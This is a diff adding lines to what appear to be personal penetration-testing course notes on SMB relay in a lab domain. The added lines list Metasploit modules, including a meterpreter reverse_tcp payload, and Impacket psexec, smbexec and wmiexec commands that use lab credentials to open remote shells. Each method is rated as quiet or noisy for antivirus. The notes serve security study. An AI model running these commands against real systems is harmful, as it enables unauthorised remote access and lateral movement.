@@ -103,3 +103,23 @@ Mitigation strategies SMB Relay
 - limit dimain admin scope
 - local admin restriction (+ service desk tickets)
 
+Shell:
+
+msf6 > search psexec
+use exploit/windows/smb/webexec
+SMBDomain marvel.local
+payload => windows/x64/meterpreter/reverse_tcp
+does NOT work
+
+QUIET:
+try:
+psexec.py marvel.local/fcastle:Pass@192.168.0.__
+try:
+└─# smbexec.py marvel.local/fcastle:Pass@192.168.0.__
+try:
+└─# wmiexec.py marvel.local/fcastle:Pa$$word@192.168.0.__
+
+NOISY:
+msf6 exploit(windows/smb/webexec) > use windows/smb/psexec (noisy - antivirus)
+
+
